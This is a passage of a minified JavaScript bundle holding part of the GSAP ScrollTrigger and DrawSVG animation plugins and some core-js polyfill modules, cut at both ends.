                  (St = J(Jt)),
                  (Dt = St[te + Ht.os2]),
                  (ft = e.getProperty(Jt)),
                  (_t = e.quickSetter(Jt, Ht.a, Q)),
                  At(Jt, lt, St),
                  (it = Lt(Jt))),
                ge &&
                  ((L = q(ge) ? tt(ge, ot) : ot),
                  (M = ut("scroller-start", Gt, he, Ht, L, 0)),
                  (k = ut("scroller-end", Gt, he, Ht, L, 0, M)),
                  (ct = M["offset" + Ht.op.d2]),
                  (S = ut("start", Gt, he, Ht, L, ct)),
                  (P = ut("end", Gt, he, Ht, L, ct)),
                  de ||
                    (((Wt = he).style.position =
                      "absolute" === J(Wt).position ? "absolute" : "relative"),
                    e.set([M, k], { force3D: !0 }),
                    (wt = e.quickSetter(M, Ht.a, Q)),
                    (Tt = e.quickSetter(k, Ht.a, Q)))),
                (_e.revert = function (t) {
                  var e = !1 !== t || !_e.enabled,
                    r = g;
                  e !== f &&
                    (e &&
                      ((Nt = Math.max(_e.scroll(), _e.scroll.rec || 0)),
                      (It = _e.progress),
                      (Ut = a && a.progress())),
                    S &&
                      [S, P, M, k].forEach(function (t) {
                        return (t.style.display = e ? "none" : "block");
                      }),
                    e && (g = 1),
                    _e.update(e),
                    (g = r),
                    Jt &&
                      (e
                        ? (function (t, e, r) {
                            if ((kt(r), t.parentNode === e)) {
                              var i = e.parentNode;
                              i && (i.insertBefore(t, e), i.removeChild(e));
                            }
                          })(Jt, lt, X)
                        : (!ae || !_e.isActive) && At(Jt, lt, J(Jt), bt)),
                    (f = e));
                }),
                (_e.refresh = function (i) {
                  if (!g && _e.enabled)
                    if (Jt && i && R) nt(t, "scrollEnd", xt);
                    else {
                      (g = 1),
                        Ft && Ft.kill(),
                        ee && a && a.progress(0).invalidate(),
                        f || _e.revert();
                      for (
                        var n,
                          s,
                          l,
                          h,
                          u,
                          c,
                          d,
                          p,
                          m = ye(),
                          v = De(),
                          b = V(he, Ht),
                          w = 0,
                          T = 0,
                          E = r.end,
                          C = r.endTrigger || $t,
                          F =
                            r.start ||
                            (0 === r.start ? 0 : Jt || !$t ? "0 0" : "0 100%"),
                          A = ($t && Math.max(0, dt.indexOf(_e))) || 0,
                          O = A;
                        O--;

                      )
                        (d = dt[O].pin) &&
                          (d === $t || d === Jt) &&
                          dt[O].revert();
                      for (
                        D =
                          zt(
                            F,
                            $t,
                            m,
                            Ht,
                            _e.scroll(),
                            S,
                            M,
                            _e,
                            v,
                            me,
                            de,
                            b
                          ) || (Jt ? -0.001 : 0),
                          W(E) && (E = E(_e)),
                          U(E) &&
                            !E.indexOf("+=") &&
                            (~E.indexOf(" ")
                              ? (E = (U(F) ? F.split(" ")[0] : "") + E)
                              : ((w = ht(E.substr(2), m)),
                                (E = U(F) ? F : D + w),
                                (C = $t))),
                          x =
                            Math.max(
                              D,
                              zt(
                                E || (C ? "100% 0" : b),
                                C,
                                m,
                                Ht,
                                _e.scroll() + w,
                                P,
                                k,
                                _e,
                                v,
                                me,
                                de,
                                b
                              )
                            ) || -0.001,
                          N = x - D || ((D -= 0.01) && 0.001),
                          w = 0,
                          O = A;
                        O--;

                      )
                        (d = (c = dt[O]).pin) &&
                          c.start - c._pinPush < D &&
                          ((n = c.end - c.start),
                          d === $t && (w += n),
                          d === Jt && (T += n));
                      if (
                        ((D += w),
                        (x += w),
                        (_e._pinPush = T),
                        S &&
                          w &&
                          (((n = {})[Ht.a] = "+=" + w), e.set([S, P], n)),
                        Jt)
                      )
                        (n = J(Jt)),
                          (h = Ht === $),
                          (l = _e.scroll()),
                          (vt = parseFloat(ft(Ht.a)) + T),
                          !b &&
                            x > 1 &&
                            ((ce ? o : he).style["overflow-" + Ht.a] =
                              "scroll"),
                          At(Jt, lt, n),
                          (it = Lt(Jt)),
                          (s = et(Jt, !0)),
                          (p = de && I(he, h ? Z : $)()),
                          te &&
                            (((bt = [te + Ht.os2, N + T + Q]).t = lt),
                            (O = te === K ? rt(Jt, Ht) + N + T : 0) &&
                              bt.push(Ht.d, O + Q),
                            kt(bt),
                            de && _e.scroll(Nt)),
                          de &&
                            (((u = {
                              top: s.top + (h ? l - D : p) + Q,
                              left: s.left + (h ? p : l - D) + Q,
                              boxSizing: "border-box",
                              position: "fixed",
                            }).width = u.maxWidth =
                              Math.ceil(s.width) + Q),
                            (u.height = u.maxHeight = Math.ceil(s.height) + Q),
                            (u.margin =
                              u.marginTop =
                              u.marginRight =
                              u.marginBottom =
                              u.marginLeft =
                                "0"),
                            (u[K] = n[K]),
                            (u[K + "Top"] = n[K + "Top"]),
                            (u[K + "Right"] = n[K + "Right"]),
                            (u[K + "Bottom"] = n[K + "Bottom"]),
                            (u[K + "Left"] = n[K + "Left"]),
                            (Y = (function (t, e, r) {
                              for (
                                var i, n = [], s = t.length, o = r ? 8 : 0;
                                o < s;
                                o += 2
                              )
                                (i = t[o]), n.push(i, i in e ? e[i] : t[o + 1]);
                              return (n.t = t.t), n;
                            })(X, u, ae))),
                          a
                            ? (a.progress(1, !0),
                              (yt = ft(Ht.a) - vt + N + T),
                              N !== yt && Y.splice(Y.length - 2, 2),
                              a.progress(0, !0))
                            : (yt = N);
                      else if ($t && _e.scroll())
                        for (s = $t.parentNode; s && s !== o; )
                          s._pinOffset &&
                            ((D -= s._pinOffset), (x -= s._pinOffset)),
                            (s = s.parentNode);
                      for (O = 0; O < A; O++)
                        (c = dt[O].pin) &&
                          (c === $t || c === Jt) &&
                          dt[O].revert(!1);
                      (_e.start = D),
                        (_e.end = x),
                        (_ = y = _e.scroll()) < Nt && _e.scroll(Nt),
                        _e.revert(!1),
                        (g = 0),
                        Ut && le && a.progress(Ut, !0),
                        It !== _e.progress &&
                          (Ft && a.totalProgress(It, !0),
                          (_e.progress = It),
                          _e.update()),
                        Jt &&
                          te &&
                          (lt._pinOffset = Math.round(_e.progress * yt)),
                        Qt && Qt(_e);
                    }
                }),
                (_e.getVelocity = function () {
                  return ((_e.scroll() - y) / (F() - p)) * 1e3 || 0;
                }),
                (_e.update = function (t, e) {
                  var r,
                    i,
                    n,
                    s,
                    h,
                    u = _e.scroll(),
                    d = t ? 0 : (u - D) / N,
                    f = d < 0 ? 0 : d > 1 ? 1 : d || 0,
                    m = _e.progress;
                  if (
                    (e &&
                      ((y = _),
                      (_ = u),
                      oe &&
                        ((Ct = Et), (Et = a && !le ? a.totalProgress() : f))),
                    re &&
                      !f &&
                      Jt &&
                      !g &&
                      !E &&
                      R &&
                      D < u + ((u - y) / (F() - p)) * re &&
                      (f = 1e-4),
                    f !== m && _e.enabled)
                  ) {
                    if (
                      ((s =
                        (h =
                          (r = _e.isActive = !!f && f < 1) != (!!m && m < 1)) ||
                        !!f != !!m),
                      (_e.direction = f > m ? 1 : -1),
                      (_e.progress = f),
                      le ||
                        (!Ft || g || E
                          ? a && a.totalProgress(f, !!g)
                          : ((Ft.vars.totalProgress = f),
                            Ft.invalidate().restart())),
                      Jt)
                    )
                      if ((t && te && (lt.style[te + Ht.os2] = Dt), de)) {
                        if (s) {
                          if (
                            ((n =
                              !t && f > m && x + 1 > u && u + 1 >= V(he, Ht)),
                            ae)
                          )
                            if (t || (!r && !n)) jt(Jt, lt);
                            else {
                              var v = et(Jt, !0),
                                b = u - D;
                              jt(
                                Jt,
                                o,
                                v.top + (Ht === $ ? b : 0) + Q,
                                v.left + (Ht === $ ? 0 : b) + Q
                              );
                            }
                          kt(r || n ? Y : it),
                            (yt !== N && f < 1 && r) ||
                              _t(vt + (1 !== f || n ? 0 : yt));
                        }
                      } else _t(vt + yt * f);
                    oe && !l.tween && !g && !E && Ot.restart(!0),
                      Yt &&
                        (h || (se && f && (f < 1 || !w))) &&
                        c(Yt.targets).forEach(function (t) {
                          return t.classList[r || se ? "add" : "remove"](
                            Yt.className
                          );
                        }),
                      Xt && !le && !t && Xt(_e),
                      s && !g
                        ? ((i = f && !m ? 0 : 1 === f ? 1 : 1 === m ? 2 : 3),
                          le &&
                            ((n =
                              (!h && "none" !== fe[i + 1] && fe[i + 1]) ||
                              fe[i]),
                            a &&
                              ("complete" === n || "reset" === n || n in a) &&
                              ("complete" === n
                                ? a.pause().totalProgress(1)
                                : "reset" === n
                                ? a.restart(!0).pause()
                                : a[n]()),
                            Xt && Xt(_e)),
                          (!h && w) ||
                            (Kt && h && Kt(_e),
                            pe[i] && pe[i](_e),
                            se && (1 === f ? _e.kill(!1, 1) : (pe[i] = 0)),
                            h || (pe[(i = 1 === f ? 1 : 3)] && pe[i](_e))))
                        : le && Xt && !g && Xt(_e);
                  }
                  Tt && (wt(u + (M._isFlipped ? 1 : 0)), Tt(u));
                }),
                (_e.enable = function () {
                  _e.enabled ||
                    ((_e.enabled = !0),
                    nt(he, "resize", mt),
                    nt(he, "scroll", gt),
                    ve && nt(t, "refreshInit", ve),
                    a && a.add
                      ? e.delayedCall(0.01, function () {
                          return D || x || _e.refresh();
                        }) &&
                        (N = 0.01) &&
                        (D = x = 0)
                      : _e.refresh());
                }),
                (_e.disable = function (e, r) {
                  if (
                    _e.enabled &&
                    (!1 !== e && _e.revert(),
                    (_e.enabled = _e.isActive = !1),
                    r || (Ft && Ft.pause()),
                    (Nt = 0),
                    h && (h.uncache = 1),
                    ve && st(t, "refreshInit", ve),
                    Ot &&
                      (Ot.pause(), l.tween && l.tween.kill() && (l.tween = 0)),
                    !ce)
                  ) {
                    for (var i = dt.length; i--; )
                      if (dt[i].scroller === he && dt[i] !== _e) return;
                    st(he, "resize", mt), st(he, "scroll", gt);
                  }
                }),
                (_e.kill = function (t, e) {
                  _e.disable(t, e), Gt && delete pt[Gt];
                  var r = dt.indexOf(_e);
                  dt.splice(r, 1),
                    r === v && Pt > 0 && v--,
                    a &&
                      ((a.scrollTrigger = null),
                      t && a.render(-1),
                      e || a.kill()),
                    S &&
                      [S, P, M, k].forEach(function (t) {
                        return t.parentNode.removeChild(t);
                      }),
                    h && (h.uncache = 1);
                }),
                _e.enable();
            } else this.update = this.refresh = this.kill = O;
          }),
          (t.register = function (u) {
            if (
              !r &&
              ((e = u || L()),
              k() &&
                window.document &&
                ((i = window),
                (n = document),
                (s = n.documentElement),
                (o = n.body)),
              e &&
                ((c = e.utils.toArray),
                (d = e.utils.clamp),
                e.core.globals("ScrollTrigger", t),
                o))
            ) {
              (h =
                i.requestAnimationFrame ||
                function (t) {
                  return setTimeout(t, 16);
                }),
                nt(i, "mousewheel", gt),
                (a = [i, n, s, o]),
                nt(n, "scroll", gt);
              var p,
                g = o.style,
                v = g.borderTop;
              (g.borderTop = "1px solid #000"),
                (p = et(o)),
                ($.m = Math.round(p.top + $.sc()) || 0),
                (Z.m = Math.round(p.left + Z.sc()) || 0),
                v ? (g.borderTop = v) : g.removeProperty("border-top"),
                (f = setInterval(ft, 200)),
                e.delayedCall(0.5, function () {
                  return (E = 0);
                }),
                nt(n, "touchcancel", O),
                nt(o, "touchstart", O),
                it(nt, n, "pointerdown,touchstart,mousedown", function () {
                  return (m = 1);
                }),
                it(nt, n, "pointerup,touchend,mouseup", function () {
                  return (m = 0);
                }),
                (_ = e.utils.checkPrefix("transform")),
                Rt.push(_),
                (r = F()),
                (l = e.delayedCall(0.2, Et).pause()),
                (x = [
                  n,
                  "visibilitychange",
                  function () {
                    var t = i.innerWidth,
                      e = i.innerHeight;
                    n.hidden
                      ? ((y = t), (D = e))
                      : (y === t && D === e) || mt();
                  },
                  n,
                  "DOMContentLoaded",
                  Et,
                  i,
                  "load",
                  function () {
                    return R || Et();
                  },
                  i,
                  "resize",
                  mt,
                ]),
                N(nt);
            }
            return r;
          }),
          (t.defaults = function (t) {
            for (var e in t) at[e] = t[e];
          }),
          (t.kill = function () {
            (A = 0),
              dt.slice(0).forEach(function (t) {
                return t.kill(1);
              });
          }),
          (t.config = function (t) {
            "limitCallbacks" in t && (w = !!t.limitCallbacks);
            var e = t.syncInterval;
            (e && clearInterval(f)) || ((f = e) && setInterval(ft, e)),
              "autoRefreshEvents" in t &&
                (N(st) || N(nt, t.autoRefreshEvents || "none"));
          }),
          (t.scrollerProxy = function (t, e) {
            var r = c(t)[0];
            B(r) ? C.unshift(i, e, o, e, s, e) : C.unshift(r, e);
          }),
          (t.matchMedia = function (t) {
            var e, r, n, s, o;
            for (r in t)
              (n = yt.indexOf(r)),
                (s = t[r]),
                (T = r),
                "all" === r
                  ? s()
                  : (e = i.matchMedia(r)) &&
                    (e.matches && (o = s()),
                    ~n
                      ? ((yt[n + 1] = Y(yt[n + 1], s)),
                        (yt[n + 2] = Y(yt[n + 2], o)))
                      : ((n = yt.length),
                        yt.push(r, s, o),
                        e.addListener
                          ? e.addListener(Dt)
                          : e.addEventListener("change", Dt)),
                    (yt[n + 3] = e.matches)),
                (T = 0);
            return yt;
          }),
          (t.clearMatchMedia = function (t) {
            t || (yt.length = 0), (t = yt.indexOf(t)) >= 0 && yt.splice(t, 4);
          }),
          t
        );
      })();
      (Nt.version = "3.5.1"),
        (Nt.saveStyles = function (t) {
          return t
            ? c(t).forEach(function (t) {
                var r = wt.indexOf(t);
                r >= 0 && wt.splice(r, 4),
                  wt.push(t, t.style.cssText, e.core.getCache(t), T);
              })
            : wt;
        }),
        (Nt.revert = function (t, e) {
          return St(!t, e);
        }),
        (Nt.create = function (t, e) {
          return new Nt(t, e);
        }),
        (Nt.refresh = function (t) {
          return t ? mt() : Et(!0);
        }),
        (Nt.update = Ft),
        (Nt.maxScroll = function (t, e) {
          return V(t, e ? Z : $);
        }),
        (Nt.getScrollFunc = function (t, e) {
          return I(c(t)[0], e ? Z : $);
        }),
        (Nt.getById = function (t) {
          return pt[t];
        }),
        (Nt.getAll = function () {
          return dt.slice(0);
        }),
        (Nt.isScrolling = function () {
          return !!R;
        }),
        (Nt.addEventListener = function (t, e) {
          var r = _t[t] || (_t[t] = []);
          ~r.indexOf(e) || r.push(e);
        }),
        (Nt.removeEventListener = function (t, e) {
          var r = _t[t],
            i = r && r.indexOf(e);
          i >= 0 && r.splice(i, 1);
        }),
        (Nt.batch = function (t, r) {
          var i,
            n = [],
            s = {},
            o = r.interval || 0.016,
            a = r.batchMax || 1e9,
            l = function (t, r) {
              var i = [],
                n = [],
                s = e
                  .delayedCall(o, function () {
                    r(i, n), (i = []), (n = []);
                  })
                  .pause();
              return function (t) {
                i.length || s.restart(!0),
                  i.push(t.trigger),
                  n.push(t),
                  a <= i.length && s.progress(1);
              };
            };
          for (i in r)
            s[i] =
              "on" === i.substr(0, 2) && W(r[i]) && "onRefreshInit" !== i
                ? l(0, r[i])
                : r[i];
          return (
            W(a) &&
              ((a = a()),
              nt(Nt, "refresh", function () {
                return (a = r.batchMax());
              })),
            c(t).forEach(function (t) {
              var e = {};
              for (i in s) e[i] = s[i];
              (e.trigger = t), n.push(Nt.create(e));
            }),
            n
          );
        }),
        (Nt.sort = function (t) {
          return dt.sort(
            t ||
              function (t, e) {
                return (
                  -1e6 * (t.vars.refreshPriority || 0) +
                  t.start -
                  (e.start + -1e6 * (e.vars.refreshPriority || 0))
                );
              }
          );
        }),
        L() && e.registerPlugin(Nt),
        (t.ScrollTrigger = Nt),
        (t.default = Nt),
        Object.defineProperty(t, "__esModule", { value: !0 });
    })(e);
  },
  function (t, e) {
    t.exports = function (t, e) {
      return {
        enumerable: !(1 & t),
        configurable: !(2 & t),
        writable: !(4 & t),
        value: e,
      };
    };
  },
  function (t, e, r) {
    var i = r(1),
      n = r(7),
      s = r(3),
      o = r(30),
      a = r(52),
      l = r(20),
      h = l.get,
      u = l.enforce,
      c = String(String).split("String");
    (t.exports = function (t, e, r, a) {
      var l = !!a && !!a.unsafe,
        h = !!a && !!a.enumerable,
        d = !!a && !!a.noTargetGet;
      "function" == typeof r &&
        ("string" != typeof e || s(r, "name") || n(r, "name", e),
        (u(r).source = c.join("string" == typeof e ? e : ""))),
        t !== i
          ? (l ? !d && t[e] && (h = !0) : delete t[e],
            h ? (t[e] = r) : n(t, e, r))
          : h
          ? (t[e] = r)
          : o(e, r);
    })(Function.prototype, "toString", function () {
      return ("function" == typeof this && h(this).source) || a(this);
    });
  },
  function (t, e, r) {
    var i = r(55),
      n = r(1),
      s = function (t) {
        return "function" == typeof t ? t : void 0;
      };
    t.exports = function (t, e) {
      return arguments.length < 2
        ? s(i[t]) || s(n[t])
        : (i[t] && i[t][e]) || (n[t] && n[t][e]);
    };
  },
  function (t, e, r) {
    var i = r(29);
    t.exports = function (t) {
      return Object(i(t));
    };
  },
  function (t, e, r) {
    var i = r(5);
    t.exports = function (t, e) {
      if (!i(t)) return t;
      var r, n;
      if (e && "function" == typeof (r = t.toString) && !i((n = r.call(t))))
        return n;
      if ("function" == typeof (r = t.valueOf) && !i((n = r.call(t)))) return n;
      if (!e && "function" == typeof (r = t.toString) && !i((n = r.call(t))))
        return n;
      throw TypeError("Can't convert object to primitive value");
    };
  },
  function (t, e, r) {
    var i,
      n,
      s,
      o = r(82),
      a = r(1),
      l = r(5),
      h = r(7),
      u = r(3),
      c = r(21),
      d = r(23),
      p = a.WeakMap;
    if (o) {
      var f = new p(),
        g = f.get,
        m = f.has,
        _ = f.set;
      (i = function (t, e) {
        return _.call(f, t, e), e;
      }),
        (n = function (t) {
          return g.call(f, t) || {};
        }),
        (s = function (t) {
          return m.call(f, t);
        });
    } else {
      var v = c("state");
      (d[v] = !0),
        (i = function (t, e) {
          return h(t, v, e), e;
        }),
        (n = function (t) {
          return u(t, v) ? t[v] : {};
        }),
        (s = function (t) {
          return u(t, v);
        });
    }
    t.exports = {
      set: i,
      get: n,
      has: s,
      enforce: function (t) {
        return s(t) ? n(t) : i(t, {});
      },
      getterFor: function (t) {
        return function (e) {
          var r;
          if (!l(e) || (r = n(e)).type !== t)
            throw TypeError("Incompatible receiver, " + t + " required");
          return r;
        };
      },
    };
  },
  function (t, e, r) {
    var i = r(31),
      n = r(32),
      s = i("keys");
    t.exports = function (t) {
      return s[t] || (s[t] = n(t));
    };
  },
  function (t, e) {
    t.exports = !1;
  },
  function (t, e) {
    t.exports = {};
  },
  function (t, e, r) {
    var i = r(28);
    t.exports =
      Array.isArray ||
      function (t) {
        return "Array" == i(t);
      };
  },
  function (t, e, r) {
    var i,
      n = r(9),
      s = r(87),
      o = r(36),
      a = r(23),
      l = r(88),
      h = r(51),
      c = r(21)("IE_PROTO"),
      d = function () {},
      p = function (t) {
        return "<script>" + t + "</script>";
      },
      f = function () {
        try {
          i = document.domain && new ActiveXObject("htmlfile");
        } catch (t) {}
        var t, e;
        f = i
          ? (function (t) {
              t.write(p("")), t.close();
              var e = t.parentWindow.Object;
              return (t = null), e;
            })(i)
          : (((e = h("iframe")).style.display = "none"),
            l.appendChild(e),
            (e.src = String("javascript:")),
            (t = e.contentWindow.document).open(),
            t.write(p("document.F=Object")),
            t.close(),
            t.F);
        for (var r = o.length; r--; ) delete f.prototype[o[r]];
        return f();
      };
    (a[c] = !0),
      (t.exports =
        Object.create ||
        function (t, e) {
          var r;
          return (
            null !== t
              ? ((d.prototype = n(t)),
                (r = new d()),
                (d.prototype = null),
                (r[c] = t))
              : (r = f()),
            void 0 === e ? r : s(r, e)
          );
        });
  },
  function (t, e, r) {
    !(function (t) {
      "use strict";
      var e,
        r,
        i,
        n,
        s,
        o = function () {
          return "undefined" != typeof window;
        },
        a = function () {
          return e || (o() && (e = window.gsap) && e.registerPlugin && e);
        },
        l = /[-+=\.]*\d+[\.e\-\+]*\d*[e\-\+]*\d*/gi,
        h = {
          rect: ["width", "height"],
          circle: ["r", "r"],
          ellipse: ["rx", "ry"],
          line: ["x2", "y2"],
        },
        u = function (t) {
          return Math.round(1e4 * t) / 1e4;
        },
        c = function (t) {
          return parseFloat(t || 0);
        },
        d = function (t, e) {
          return c(t.getAttribute(e));
        },
        p = Math.sqrt,
        f = function (t, e, r, i, n, s) {
          return p(
            Math.pow((c(r) - c(t)) * n, 2) + Math.pow((c(i) - c(e)) * s, 2)
          );
        },
        g = function (t) {
          return console.warn(t);
        },
        m = function (t) {
          return "non-scaling-stroke" === t.getAttribute("vector-effect");
        },
        _ = function (t) {
          if (!(t = r(t)[0])) return 0;
          var e,
            i,
            n,
            s,
            o,
            a,
            u,
            c = t.tagName.toLowerCase(),
            _ = t.style,
            v = 1,
            y = 1;
          m(t) &&
            ((y = t.getScreenCTM()),
            (v = p(y.a * y.a + y.b * y.b)),
            (y = p(y.d * y.d + y.c * y.c)));
          try {
            i = t.getBBox();
          } catch (t) {
            g(
              "Some browsers won't measure invisible elements (like display:none or masks inside defs)."
            );
          }
          var D = i || { x: 0, y: 0, width: 0, height: 0 },
            x = D.x,
            b = D.y,
            w = D.width,
            T = D.height;
          if (
            ((i && (w || T)) ||
              !h[c] ||
              ((w = d(t, h[c][0])),
              (T = d(t, h[c][1])),
              "rect" !== c && "line" !== c && ((w *= 2), (T *= 2)),
              "line" === c &&
                ((x = d(t, "x1")),
                (b = d(t, "y1")),
                (w = Math.abs(w - x)),
                (T = Math.abs(T - b)))),
            "path" === c)
          )
            (s = _.strokeDasharray),
              (_.strokeDasharray = "none"),
              (e = t.getTotalLength() || 0),
              v !== y &&
                g(
                  "Warning: <path> length cannot be measured when vector-effect is non-scaling-stroke and the element isn't proportionally scaled."
                ),
              (e *= (v + y) / 2),
              (_.strokeDasharray = s);
          else if ("rect" === c) e = 2 * w * v + 2 * T * y;
          else if ("line" === c) e = f(x, b, x + w, b + T, v, y);
          else if ("polyline" === c || "polygon" === c)
            for (
              n = t.getAttribute("points").match(l) || [],
                "polygon" === c && n.push(n[0], n[1]),
                e = 0,
                o = 2;
              o < n.length;
              o += 2
            )
              e += f(n[o - 2], n[o - 1], n[o], n[o + 1], v, y) || 0;
          else
            ("circle" !== c && "ellipse" !== c) ||
              ((a = (w / 2) * v),
              (u = (T / 2) * y),
              (e = Math.PI * (3 * (a + u) - p((3 * a + u) * (a + 3 * u)))));
          return e || 0;
        },
        v = function (t, e) {
          if (!(t = r(t)[0])) return [0, 0];
          e || (e = _(t) + 1);
          var n = i.getComputedStyle(t),
            s = n.strokeDasharray || "",
            o = c(n.strokeDashoffset),
            a = s.indexOf(",");
          return (
            a < 0 && (a = s.indexOf(" ")),
            (s = a < 0 ? e : c(s.substr(0, a)) || 1e-5) > e && (s = e),
            [Math.max(0, -o), Math.max(0, s - o)]
          );
        },
        y = function () {
          o() &&
            ((i = window),
            (s = e = a()),
            (r = e.utils.toArray),
            (n = -1 !== ((i.navigator || {}).userAgent || "").indexOf("Edge")));
        },
        D = {
          version: "3.5.1",
          name: "drawSVG",
          register: function (t) {
            (e = t), y();
          },
          init: function (t, e, r, o, a) {
            if (!t.getBBox) return !1;
            s || y();
            var l,
              h,
              d,
              p,
              f = _(t) + 1;
            return (
              (this._style = t.style),
              (this._target = t),
              e + "" == "true"
                ? (e = "0 100%")
                : e
                ? -1 === (e + "").indexOf(" ") && (e = "0 " + e)
                : (e = "0 0"),
              (h = (function (t, e, r) {
                var i,
                  n,
                  s = t.indexOf(" ");
                return (
                  s < 0
                    ? ((i = void 0 !== r ? r + "" : t), (n = t))
                    : ((i = t.substr(0, s)), (n = t.substr(s + 1))),
                  (i = ~i.indexOf("%") ? (c(i) / 100) * e : c(i)) >
                  (n = ~n.indexOf("%") ? (c(n) / 100) * e : c(n))
                    ? [n, i]
                    : [i, n]
                );
              })(e, f, (l = v(t, f))[0])),
              (this._length = u(f + 10)),
              0 === l[0] && 0 === h[0]
                ? ((d = Math.max(1e-5, h[1] - f)),
                  (this._dash = u(f + d)),
                  (this._offset = u(f - l[1] + d)),
                  (this._offsetPT = this.add(
                    this,
                    "_offset",
                    this._offset,
                    u(f - h[1] + d)
                  )))
                : ((this._dash = u(l[1] - l[0]) || 1e-6),
                  (this._offset = u(-l[0])),
                  (this._dashPT = this.add(
                    this,
                    "_dash",
                    this._dash,
                    u(h[1] - h[0]) || 1e-5
                  )),
                  (this._offsetPT = this.add(
                    this,
                    "_offset",
                    this._offset,
                    u(-h[0])
                  ))),
              n &&
                (p = i.getComputedStyle(t)).strokeLinecap !==
                  p.strokeLinejoin &&
                ((h = c(p.strokeMiterlimit)),
                this.add(t.style, "strokeMiterlimit", h, h + 0.01)),
              (this._live = m(t) || ~(e + "").indexOf("live")),
              this._props.push("drawSVG"),
              1
            );
          },
          render: function (t, e) {
            var r,
              i,
              n,
              s,
              o = e._pt,
              a = e._style;
            if (o) {
              for (
                e._live &&
                (r = _(e._target) + 11) !== e._length &&
                ((i = r / e._length),
                (e._length = r),
                (e._offsetPT.s *= i),
                (e._offsetPT.c *= i),
                e._dashPT
                  ? ((e._dashPT.s *= i), (e._dashPT.c *= i))
                  : (e._dash *= i));
                o;

              )
                o.r(t, o.d), (o = o._next);
              (n = e._dash),
                (s = e._offset),
                (r = e._length),
                (a.strokeDashoffset = e._offset),
                1 !== t && t
                  ? (a.strokeDasharray = n + "px," + r + "px")
                  : (n - s < 0.001 &&
                      r - n <= 10 &&
                      (a.strokeDashoffset = s + 1),
                    (a.strokeDasharray =
                      s < 0.001 && r - n <= 10
                        ? "none"
                        : s === n
                        ? "0px, 999999px"
                        : n + "px," + r + "px"));
            }
          },
          getLength: _,
          getPosition: v,
        };
      a() && e.registerPlugin(D),
        (t.DrawSVGPlugin = D),
        (t.default = D),
        Object.defineProperty(t, "__esModule", { value: !0 });
    })(e);
  },
  function (t, e, r) {
    var i = r(11),
      n = r(48),
      s = r(15),
      o = r(13),
      a = r(19),
      l = r(3),
      h = r(50),
      u = Object.getOwnPropertyDescriptor;
    e.f = i
      ? u
      : function (t, e) {
          if (((t = o(t)), (e = a(e, !0)), h))
            try {
              return u(t, e);
            } catch (t) {}
          if (l(t, e)) return s(!n.f.call(t, e), t[e]);
        };
  },
  function (t, e) {
    var r = {}.toString;
    t.exports = function (t) {
      return r.call(t).slice(8, -1);
    };
  },
  function (t, e) {
    t.exports = function (t) {
      if (null == t) throw TypeError("Can't call method on " + t);
      return t;
    };
  },
  function (t, e, r) {
    var i = r(1),
      n = r(7);
    t.exports = function (t, e) {
      try {
        n(i, t, e);
      } catch (r) {
        i[t] = e;
      }
      return e;
    };
  },
  function (t, e, r) {
    var i = r(22),
      n = r(53);
    (t.exports = function (t, e) {
      return n[t] || (n[t] = void 0 !== e ? e : {});
    })("versions", []).push({
      version: "3.6.5",
      mode: i ? "pure" : "global",
      copyright: "© 2020 Denis Pushkarev (zloirock.ru)",
    });
  },
  function (t, e) {
    var r = 0,
      i = Math.random();
    t.exports = function (t) {
      return (
        "Symbol(" +
        String(void 0 === t ? "" : t) +
        ")_" +
        (++r + i).toString(36)
      );
    };
  },
  function (t, e, r) {
    var i = r(56),
      n = r(36).concat("length", "prototype");
    e.f =
      Object.getOwnPropertyNames ||
      function (t) {
        return i(t, n);
      };
  },
  function (t, e, r) {
    var i = r(35),
      n = Math.min;
    t.exports = function (t) {
      return t > 0 ? n(i(t), 9007199254740991) : 0;
    };
  },
  function (t, e) {
    var r = Math.ceil,
      i = Math.floor;
    t.exports = function (t) {
      return isNaN((t = +t)) ? 0 : (t > 0 ? i : r)(t);
    };
  },
  function (t, e) {
    t.exports = [
      "constructor",
      "hasOwnProperty",
      "isPrototypeOf",
      "propertyIsEnumerable",
      "toLocaleString",
      "toString",
      "valueOf",
    ];
  },
  function (t, e, r) {
    var i = r(2);
    t.exports =
      !!Object.getOwnPropertySymbols &&
      !i(function () {
        return !String(Symbol());
      });
  },
  function (t, e, r) {
    var i = r(8).f,
      n = r(3),
      s = r(4)("toStringTag");
    t.exports = function (t, e, r) {
      t &&
        !n((t = r ? t : t.prototype), s) &&
        i(t, s, { configurable: !0, value: e });
    };
  },
  function (t, e) {
    t.exports = function (t) {
      if ("function" != typeof t)
        throw TypeError(String(t) + " is not a function");
      return t;
    };
  },
  function (t, e, r) {
    "use strict";
    var i = r(13),
      n = r(91),
      s = r(41),
      o = r(20),
      a = r(66),
      l = o.set,
      h = o.getterFor("Array Iterator");
    (t.exports = a(
      Array,
      "Array",
      function (t, e) {
        l(this, { type: "Array Iterator", target: i(t), index: 0, kind: e });
      },
      function () {
        var t = h(this),
          e = t.target,
          r = t.kind,
          i = t.index++;
        return !e || i >= e.length
          ? ((t.target = void 0), { value: void 0, done: !0 })
          : "keys" == r
          ? { value: i, done: !1 }
          : "values" == r
          ? { value: e[i], done: !1 }
          : { value: [i, e[i]], done: !1 };
      },
      "values"
    )),
      (s.Arguments = s.Array),
      n("keys"),
      n("values"),
      n("entries");
  },
  function (t, e) {
    t.exports = {};
  },
  function (t, e, r) {
    var i = r(3),
      n = r(18),
      s = r(21),
      o = r(68),
      a = s("IE_PROTO"),
      l = Object.prototype;
    t.exports = o
      ? Object.getPrototypeOf
      : function (t) {
          return (
            (t = n(t)),
            i(t, a)
              ? t[a]
              : "function" == typeof t.constructor && t instanceof t.constructor
              ? t.constructor.prototype
              : t instanceof Object
              ? l
              : null
          );
        };
  },
  function (t, e, r) {
    var i = {};
    (i[r(4)("toStringTag")] = "z"), (t.exports = "[object z]" === String(i));
  },
  function (t, e, r) {
    "use strict";
    var i = r(10),
      n = r(76);
    i({ target: "Array", proto: !0, forced: [].forEach != n }, { forEach: n });
  },
  function (t, e, r) {
    var i = r(1),
      n = r(75),
      s = r(76),
      o = r(7);
    for (var a in n) {
      var l = i[a],
        h = l && l.prototype;
      if (h && h.forEach !== s)
        try {
          o(h, "forEach", s);
        } catch (t) {
          h.forEach = s;
        }
    }
  },
  function (t, e, r) {
    "use strict";
    var i = r(10),
      n = r(1),
      s = r(17),
      o = r(22),
      a = r(11),
      l = r(37),
      h = r(58),
      u = r(2),
      c = r(3),
      d = r(24),
      p = r(5),
      f = r(9),
      g = r(18),
      m = r(13),
      _ = r(19),
      v = r(15),
      y = r(25),
      D = r(59),
      x = r(33),
      b = r(89),
      w = r(57),
      T = r(27),
